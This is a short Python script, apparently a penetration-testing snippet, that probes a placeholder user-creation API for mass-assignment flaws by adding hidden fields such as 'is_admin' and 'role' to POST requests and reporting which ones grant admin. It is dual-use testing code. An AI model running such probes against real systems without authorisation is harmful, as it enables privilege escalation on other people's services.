# Python script
import requests

url = "http://target.com/api/users"
payload = {
    "username": "test",
    "email": "test@example.com"
}

# Add hidden params
hidden_params = ["is_admin", "role", "permissions", "verified"]

for param in hidden_params:
    test_payload = payload.copy()
    test_payload[param] = True
    r = requests.post(url, json=test_payload)
    if "admin" in r.text.lower():
        print(f"Vulnerable to: {param}")
